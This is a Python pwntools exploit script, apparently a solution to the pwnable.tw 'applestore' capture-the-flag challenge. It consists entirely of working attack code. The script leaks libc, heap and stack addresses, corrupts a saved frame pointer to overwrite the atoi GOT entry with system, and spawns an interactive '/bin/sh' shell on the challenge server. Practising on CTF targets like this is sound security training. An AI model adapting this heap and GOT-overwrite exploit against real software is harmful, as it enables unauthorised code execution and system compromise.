from pwn import *
import sys

def add(no):
	print p.recv()
	p.sendline("2")
	print p.recv()
	p.sendline(str(no))

def remove(no):
	print p.recv()
	p.sendline("3")
	print p.recv()
	p.send(str(no))

def show():
	print p.recv()
	p.sendline("4")
	print p.recv()
	p.sendline("y")

def checkout():
	print p.recv()
	p.sendline("5")
	print p.recv()
	p.sendline("y")

def leak(addr):
	print p.recv()
	p.sendline("4")
	print p.recv()
	payload = "y\x00" + p32(addr) + "\x00"*4 + p32(0x804b068+4)
	p.sendline(payload)
	p.recvuntil("27: ")
	leak = u32(p.recv(4))
	return leak

target = "./applestore"
libc_name = "./libc_32.so.6"
binary = ELF(target)
libc = ELF(libc_name)

if len(sys.argv) == 1:
	p = process(target, env={"LD_PRELOAD":libc_name})
else:
	p = remote("chall.pwnable.tw", 10104)

for i in range(6):
	add(1)
for i in range(20):
	add(2)

checkout()

leak1 = leak(binary.got['read'])
heap = leak(0x0804B070)
stack = leak(heap+0x4a0)
libc_base = leak1 - (0xf7ef31c0 - 0xf7e1f000)
log.info("libc base  : 0x%x" % libc_base)
log.info("heap       : 0x%x" % heap)
log.info("stack      : 0x%x" % stack)

sfp = stack + 32
mal_sfp = binary.got['atoi'] + 0x22
log.info("SFP of del : 0x%x" % sfp)
log.info("Mal SFP    : 0x%x" % mal_sfp)

raw_input()
payload = "27"
payload += "\x00"*8
payload += p32(sfp-12)
payload += p32(mal_sfp)
payload += "\x00"*3
remove(payload)

p.recv()
#payload = "1234567812345678"
payload = p32(libc_base + libc.symbols['system'])
payload += ";/bin/sh;"
p.send(payload)
p.interactive()
